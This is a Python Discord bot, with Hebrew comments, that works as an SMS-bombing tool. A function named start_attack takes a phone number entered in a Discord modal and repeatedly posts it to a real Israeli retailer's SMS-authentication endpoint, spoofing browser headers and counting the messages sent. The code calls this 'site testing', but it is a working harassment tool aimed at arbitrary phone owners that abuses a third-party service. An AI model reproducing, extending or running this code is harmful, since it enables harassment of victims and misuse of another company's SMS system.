import discord
from discord.ext import commands
from discord import ui
import requests
import uuid
import os
import time
import random
import string
from flask import Flask
from threading import Thread
from datetime import datetime

# --- שרת Flask (Keep Alive) שמתאים ל-Render ---
app = Flask('')
@app.route('/')
def home(): return "Bot Online"

def run_flask():
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))

def keep_alive():
    t = Thread(target=run_flask)
    t.start()

# --- הגדרות בוט ---
TOKEN = os.environ.get('DISCORD_TOKEN')
ADMIN_ID = 1281295891579408418 

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix='!', intents=intents)

# --- פונקציית התקיפה (בדיקה של אתר אחד בכל פעם) ---
async def start_attack(interaction, target, rounds):
    success_count = 0
    failed_count = 0
    
    for r in range(rounds):
        apis = [
            {
                "n": "Teva Bari", 
                "u": "https://www.tevabari.co.il/index.php", 
                "d": {
                    "username": target, 
                    "option": "com_ajax", 
                    "plugin": "smsauth", 
                    "group": "authentication", 
                    "method": "smsauth", 
                    "task": "send", 
                    "format": "json"
                }, 
                "type": "form", 
                "ref": "https://www.tevabari.co.il/"
            }
        ]

        for site in apis:
            try:
                # Headers דומים לדפדפן אמיתי
                h = {
                    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
                    "Referer": site["ref"],
                    "Accept": "application/json, text/javascript, */*; q=0.01",
                    "X-Requested-With": "XMLHttpRequest"
                }
                
                # שליחה כ-Form Data
                res = requests.post(site["u"], data=site["d"], headers=h, timeout=5.0)
                
                # הדפסה ללוגים של Render
                print(f"Testing {site['n']} | Status: {res.status_code} | Response: {res.text[:50]}")
                
                if res.status_code in [200, 201]:
                    success_count += 1
                else:
                    failed_count += 1
                
                time.sleep(1.5) 
            except Exception as e:
                print(f"Error on {site['n']}: {e}")
                failed_count += 1
        
        time.sleep(1.0)

    # שליחת סיכום למשתמש
    embed = discord.Embed(title="🔍 תוצאות בדיקת אתר", color=0x3498db)
    embed.add_field(name="✅ הודעות שנשלחו", value=str(success_count))
    embed.add_field(name="❌ כשלונות", value=str(failed_count))
    embed.set_footer(text="בדיקת אתר: טבע ברי")
    await interaction.followup.send(embed=embed, ephemeral=True)

# --- ממשק דיסקורד ---
class AttackModal(ui.Modal, title='🚀 בדיקת אתרים (אחד אחד)'):
    phone = ui.TextInput(label='מספר טלפון', placeholder='0501234567', min_length=10, max_length=10)
    async def on_submit(self, interaction: discord.Interaction):
        await interaction.response.send_message(f"בודק את 'טבע ברי' על {self.phone.value}...", ephemeral=True)
        await start_attack(interaction, self.phone.value, 1)

class AttackView(ui.View):
    def __init__(self): super().__init__(timeout=None)
    @ui.button(label='🔍 בדוק אתר: טבע ברי', style=discord.ButtonStyle.success, custom_id='test_btn')
    async def test_button(self, interaction: discord.Interaction, button: ui.Button):
        await interaction.response.send_modal(AttackModal())

@bot.event
async def on_ready():
    print(f'✅ {bot.user.name} מחובר ומוכן לבדיקה')
    bot.add_view(AttackView())

@bot.command()
async def setup(ctx):
    if ctx.author.id == ADMIN_ID:
        await ctx.send("תפריט בדיקת אתרים (שלב 1):", view=AttackView())

if __name__ == "__main__":
    keep_alive()
    bot.run(TOKEN)
